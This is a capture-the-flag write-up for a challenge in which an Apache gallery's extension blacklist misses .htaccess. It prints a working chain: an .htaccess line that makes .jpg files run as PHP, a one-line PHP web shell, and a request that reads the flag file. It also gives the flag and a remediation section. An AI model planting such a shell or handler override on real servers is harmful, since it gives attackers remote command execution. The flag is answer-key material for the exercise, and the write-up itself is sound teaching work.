# 06 · upload-htaccess (medium/hard)

A gallery stores uploads under `/uploads/` and rejects PHP extensions (`.php`,
`.phtml`, `.phar`, …). It's an extension blacklist, and the upload directory runs
with `AllowOverride All`, so Apache honours a `.htaccess` placed there.

## Vulnerability
The blacklist blocks "PHP" extensions but not `.htaccess` — a file that
reconfigures how Apache handles other extensions in that directory. Change the
rules first, then upload a file that now executes.

## Exploitation
1. Upload a `.htaccess`:
   ```
   AddType application/x-httpd-php .jpg
   ```
2. Upload `shell.jpg`:
   ```php
   <?php system($_GET["c"]); ?>
   ```
3. Execute:
   ```
   GET /uploads/shell.jpg?c=cat%20/flag.txt
   ```
See `solve/solve.sh`.

## Flag
```
SecurinetsENIT{htacc3ss_turns_a_jpg_1nt0_a_w3bsh3ll}
```

## Fix
Allow-list extensions instead of blacklisting; set `AllowOverride None` and strip
execute handlers on the upload directory; store uploads outside the webroot or on
a host that never executes them.
